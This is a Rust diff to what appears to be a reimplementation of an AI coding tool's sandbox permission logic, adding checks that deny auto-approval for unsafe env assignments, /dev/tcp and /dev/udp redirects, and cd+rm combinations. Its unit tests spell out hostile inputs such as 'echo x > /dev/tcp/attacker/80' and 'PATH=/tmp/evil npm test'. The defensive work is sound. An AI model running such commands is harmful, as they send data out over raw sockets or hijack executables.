@@ -92,13 +92,91 @@ impl SandboxAutoAllowConfig {
     }
 
     /// The full auto-allow predicate guard: sandboxing enabled AND
-    /// auto-allow-if-sandboxed AND the command would be sandboxed. Mirrors the
+    /// auto-allow-if-sandboxed AND the command would be sandboxed AND none of
+    /// claude-code's `checkSandboxAutoAllow` (BAu) refusals apply. Mirrors the
     /// `isSandboxingEnabled() && isAutoAllowBashIfSandboxedEnabled() &&
-    /// shouldUseSandbox(input)` conjunction at the top of `bashToolHasPermission`.
+    /// shouldUseSandbox(input)` conjunction at the top of `bashToolHasPermission`,
+    /// PLUS the BAu refusal battery (see [`Self::bau_refuses`]) — without which a
+    /// sandboxed command carrying an unsafe env assignment, a `/dev/tcp|udp`
+    /// network redirect, or a `cd`+`rm` combo would be silently auto-allowed
+    /// where CC falls through to the ordinary prompt flow (PERM-SBX-BAU-01).
     #[must_use]
     pub fn auto_allows(&self, command: &str) -> bool {
-        self.enabled && self.auto_allow_bash_if_sandboxed && self.would_sandbox(command)
+        self.enabled
+            && self.auto_allow_bash_if_sandboxed
+            && self.would_sandbox(command)
+            && !bau_refuses(command)
     }
+}
+
+/// claude-code `checkSandboxAutoAllow` (BAu) refusal battery: even a sandboxable
+/// command is NOT auto-allowed (falls through to the prompt) when it contains
+/// (1) any env assignment — leading, prefix, or an argv `VAR=`/`VAR+=` token —
+/// whose NAME is outside the `Jqr` safe set; (2) any redirect targeting
+/// `/dev/tcp/*` or `/dev/udp/*` (opens a network socket); or (3) a `cd`-family
+/// command combined with `rm`/`rmdir` in the same compound command (bare-repo /
+/// wrong-dir deletion vector). Returns `true` to REFUSE auto-allow.
+///
+/// (The BAu rm-dangerous-op refusal (#3 in CC) is covered separately by the
+/// policy's catastrophic-removal guard, which runs before the sandbox branch.)
+/// Reuses the crate's already-CC-faithful primitives — the `Jqr`
+/// [`crate::allow_suggestion::SAFE_ENV_ASSIGNMENTS`] set and
+/// [`crate::path_constraints::command_has_network_device_redirect`] — so the
+/// refusal cannot drift from the corresponding deny/ask paths.
+fn bau_refuses(command: &str) -> bool {
+    let subs = crate::shell_command::split_command(command);
+
+    // (1) Unsafe env assignment anywhere (name outside the Jqr safe set).
+    for sub in &subs {
+        for tok in sub.split_whitespace() {
+            if let Some(name) = env_assignment_name(tok) {
+                if !crate::allow_suggestion::SAFE_ENV_ASSIGNMENTS.contains(&name) {
+                    return true;
+                }
+            }
+        }
+    }
+
+    // (2) Network-device redirect (`/dev/tcp/`, `/dev/udp/`), output OR input.
+    if crate::path_constraints::command_has_network_device_redirect(&subs) {
+        return true;
+    }
+
+    // (3) cd-family + rm-family co-occurrence across the compound command.
+    let (mut has_cd, mut has_rm) = (false, false);
+    for sub in &subs {
+        match first_word_basename(sub).as_deref() {
+            Some("cd" | "pushd" | "popd") => has_cd = true,
+            Some("rm" | "rmdir") => has_rm = true,
+            _ => {}
+        }
+    }
+    has_cd && has_rm
+}
+
+/// If `tok` is an env-assignment token (`NAME=…` or `NAME+=…`, NAME matching
+/// `^[A-Za-z_]\w*$`, mirroring `env_assignment_re`), return NAME; else `None`.
+fn env_assignment_name(tok: &str) -> Option<&str> {
+    let eq = tok.find('=')?;
+    let name = tok[..eq].strip_suffix('+').unwrap_or(&tok[..eq]);
+    let mut chars = name.chars();
+    let first = chars.next()?;
+    if !(first.is_ascii_alphabetic() || first == '_') {
+        return None;
+    }
+    if chars.all(|c| c.is_ascii_alphanumeric() || c == '_') {
+        Some(name)
+    } else {
+        None
+    }
+}
+
+/// First real command word of a subcommand (leading env assignments stripped),
+/// reduced to its `/`-basename — the token the cd/rm detection keys on.
+fn first_word_basename(sub: &str) -> Option<String> {
+    let stripped = crate::shell_command::strip_all_leading_env_vars(sub, None);
+    let tok = stripped.split_whitespace().next()?;
+    Some(tok.rsplit('/').next().unwrap_or(tok).to_string())
 }
 
 #[cfg(test)]
@@ -126,6 +204,46 @@ mod tests {
         assert!(c.would_sandbox("echo hi"));
         assert!(c.would_sandbox("rm -rf /tmp/x"));
         assert!(c.auto_allows("echo hi"));
+    }
+
+    // ── BAu refusal battery (PERM-SBX-BAU-01) ────────────────────────────────
+
+    #[test]
+    fn bau_refuses_unsafe_env_assignment() {
+        let c = cfg(&[]);
+        // PATH is not in the Jqr safe set → refuse auto-allow (CC prompts).
+        assert!(c.would_sandbox("PATH=/tmp/evil npm test"));
+        assert!(!c.auto_allows("PATH=/tmp/evil npm test"));
+        // An argv `VAR=` token anywhere also refuses.
+        assert!(!c.auto_allows("make FOO=1 all"));
+        // A SAFE (Jqr) env assignment still auto-allows.
+        assert!(c.auto_allows("RUST_BACKTRACE=1 cargo test"));
+    }
+
+    #[test]
+    fn bau_refuses_network_device_redirect() {
+        let c = cfg(&[]);
+        assert!(!c.auto_allows("echo x > /dev/tcp/attacker/80"));
+        assert!(!c.auto_allows("cat < /dev/udp/host/53"));
+        // A normal file redirect still auto-allows.
+        assert!(c.auto_allows("echo x > out.txt"));
+    }
+
+    #[test]
+    fn bau_refuses_cd_plus_rm_combo() {
+        let c = cfg(&[]);
+        assert!(!c.auto_allows("cd sub && rm -rf data"));
+        assert!(!c.auto_allows("pushd /x && rmdir y"));
+        // cd alone or rm alone still auto-allows (the sandbox bounds them; a truly
+        // catastrophic rm is caught by the policy's pre-sandbox removal guard).
+        assert!(c.auto_allows("cd sub && ls"));
+        assert!(c.auto_allows("rm -rf data"));
+    }
+
+    #[test]
+    fn bau_not_evaluated_when_disabled() {
+        let c = SandboxAutoAllowConfig::new(false, true, vec![]);
+        assert!(!c.auto_allows("cd sub && rm -rf data"));
     }
 
     #[test]
